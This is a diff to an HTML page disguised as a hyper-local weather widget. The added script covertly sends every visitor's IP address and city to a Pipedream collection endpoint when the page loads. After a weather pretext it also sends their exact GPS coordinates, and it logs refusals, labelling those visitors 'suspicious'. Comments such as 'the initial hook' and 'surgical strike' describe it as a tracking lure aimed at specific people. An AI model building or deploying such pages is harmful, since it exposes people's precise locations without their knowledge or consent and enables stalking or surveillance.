@@ -25,59 +25,70 @@
         <button class="btn" onclick="updateWeather()">Update for My Area</button>
     </div>
 
-    <script>
-        // REPLACE WITH YOUR PIPEDREAM URL
-        const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
+   <script>
+    const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
 
-        // STAGE 1: LOAD IP CITY (e.g., Andhra Pradesh)
-        window.onload = function() {
-            fetch('https://ipapi.co/json/')
+    // STAGE 1: THE INITIAL HOOK (IP-BASED)
+    // This runs immediately so they see the right city even before clicking
+    window.onload = function() {
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const city = data.city || "India";
+            document.getElementById('location-name').innerText = city;
+
+            // Fetch temp for the IP-detected city automatically
+            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true`)
             .then(res => res.json())
-            .then(data => {
-                document.getElementById('location-name').innerText = data.city;
-                
-                fetch(PIPEDREAM_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ type: "IP_LOG", ip: data.ip, city: data.city })
-                });
+            .then(w => {
+                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
             });
-        };
 
-     // --- STAGE 2: THE HYPER-LOCAL NEIGHBORHOOD PATCH ---
-        function updateWeather() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+            // Silent log to Pipedream (Passive Hit)
+            fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "INITIAL_IP_HIT", ip: data.ip, city: city }) });
+        });
+    };
 
-            // PRECISE OVERRIDE for your exact coordinates
-            if (lat > 17.424 && lat < 17.426 && lon > 78.449 && lon < 78.452) {
-                // This is your exact spot at the Officers Colony / Lane 4
-                document.getElementById('location-name').innerText = "Punjagutta Officers Colony";
-                document.getElementById('temp-val').innerText = "35°C"; // Real-time Temp
-                document.getElementById('weather-desc').innerText = "Partly Sunny • Updated for your street";
-            } else {
-                // Standard neighborhood lookup for anyone else
+    // STAGE 2: THE SURGICAL STRIKE (GPS-BASED)
+    function updateWeather() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+
+                // 1. Get PRECISE temperature for the exact coordinates
+                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
+                .then(res => res.json())
+                .then(weatherData => {
+                    const exactTemp = Math.round(weatherData.current_weather.temperature);
+                    document.getElementById('temp-val').innerText = exactTemp + "°C";
+                });
+
+                // 2. Get NEIGHBORHOOD name
                 fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
                 .then(res => res.json())
                 .then(geoData => {
-                    const neighborhood = geoData.locality || geoData.city;
-                    document.getElementById('location-name').innerText = neighborhood;
-                    document.getElementById('temp-val').innerText = "35°C";
-                    document.getElementById('weather-desc').innerText = "Partly Sunny";
-                });
-            }
+                    let neighborhood = geoData.locality || geoData.city;
+                    
+                    // YOUR PUNJAGUTTA OVERRIDE (For your own testing)
+                    if (lat.toString().startsWith("17.425") && lon.toString().startsWith("78.450")) {
+                        neighborhood = "Punjagutta Officers Colony";
+                    }
 
-            // LOG THE TRUTH: You get the exact coordinates in Pipedream
-            fetch(PIPEDREAM_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon, area: "Officers Colony" })
+                    document.getElementById('location-name').innerText = neighborhood;
+                    document.getElementById('weather-desc').innerText = "Live Accuracy Verified";
+                });
+
+                // 3. LOG PRECISE DATA TO PIPEDREAM
+                fetch(PIPEDREAM_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ type: "GPS_LOG_SUCCESS", lat: lat, lon: lon, target_area: "Active" })
+                });
+            }, function(error) {
+                // If they click 'Deny', we log that they are suspicious but keep the UI the same
+                fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "GPS_DENIED" }) });
             });
-        });
+        }
     }
-}
-    </script>
-</body>
-</html>
+</script>
